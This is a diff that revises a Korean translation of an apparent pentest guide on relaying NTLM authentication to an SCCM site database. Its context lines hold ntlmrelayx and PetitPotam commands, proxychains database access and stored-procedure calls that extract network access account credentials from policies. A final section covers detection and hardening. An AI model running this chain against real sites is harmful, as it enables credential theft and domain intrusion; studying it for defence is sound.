@@ -21,13 +21,13 @@
 ---
 
 ## 1. 인증되지 않은 MP 엔드포인트 열거
-MP ISAPI 확장 **GetAuth.dll**은 인증이 필요 없는 여러 매개변수를 노출합니다(사이트가 PKI 전용이 아닌 경우):
+MP ISAPI 확장 **GetAuth.dll**는 인증이 필요 없는 여러 매개변수를 노출합니다 (사이트가 PKI 전용이 아닌 경우):
 
 | 매개변수 | 목적 |
 |-----------|---------|
 | `MPKEYINFORMATIONMEDIA` | 사이트 서명 인증서 공개 키 + *x86* / *x64* **모든 알 수 없는 컴퓨터** 장치의 GUID를 반환합니다. |
 | `MPLIST` | 사이트의 모든 관리 지점을 나열합니다. |
-| `SITESIGNCERT` | 기본 사이트 서명 인증서를 반환합니다(LDAP 없이 사이트 서버 식별). |
+| `SITESIGNCERT` | 기본 사이트 서명 인증서를 반환합니다 (LDAP 없이 사이트 서버 식별). |
 
 나중에 DB 쿼리를 위해 **clientID** 역할을 할 GUID를 가져옵니다:
 ```bash
@@ -44,7 +44,7 @@ ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support
 python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
 -u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
 ```
-강제 조작이 발생하면 다음과 같은 내용을 볼 수 있어야 합니다:
+강제 실행이 발생하면 다음과 같은 내용을 볼 수 있어야 합니다:
 ```
 [*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
 [*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
@@ -56,7 +56,7 @@ SOCKS 프록시를 통해 연결 (기본 포트 1080):
 ```bash
 proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
 ```
-**CM_<SiteCode>** DB로 전환합니다(3자리 사이트 코드를 사용합니다, 예: `CM_001`).
+**CM_<SiteCode>** DB로 전환합니다 (3자리 사이트 코드를 사용하세요, 예: `CM_001`).
 
 ### 3.1 알 수 없는 컴퓨터 GUID 찾기 (선택 사항)
 ```sql
@@ -69,7 +69,7 @@ WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
 ```sql
 EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
 ```
-각 행은 `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`을 포함합니다.
+각 행에는 `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`이 포함되어 있습니다.
 
 정책에 집중하세요:
 * **NAAConfig**  – 네트워크 액세스 계정 자격 증명
@@ -81,7 +81,7 @@ EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N''
 ```sql
 EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
 ```
-> 중요: SSMS에서 “가져온 최대 문자 수”를 증가시키십시오 (>65535) 그렇지 않으면 blob이 잘립니다.
+> 중요: SSMS에서 "가져온 최대 문자"를 증가시키세요 (>65535), 그렇지 않으면 blob이 잘릴 수 있습니다.
 
 ---
 
@@ -127,7 +127,7 @@ AND  pe.permission_name='EXECUTE';
 ---
 
 ## 6. 탐지 및 강화
-1. **MP 로그인 모니터링** – 호스트가 아닌 IP에서 로그인하는 모든 MP 컴퓨터 계정 ≈ 릴레이.
+1. **MP 로그인 모니터링** – 호스트가 아닌 IP에서 로그인하는 MP 컴퓨터 계정 ≈ 릴레이.
 2. 사이트 데이터베이스에서 **인증을 위한 확장 보호 (EPA)** 활성화 (`PREVENT-14`).
 3. 사용하지 않는 NTLM 비활성화, SMB 서명 강제, RPC 제한 (
 `PetitPotam`/`PrinterBug`에 대해 사용된 동일한 완화 조치).
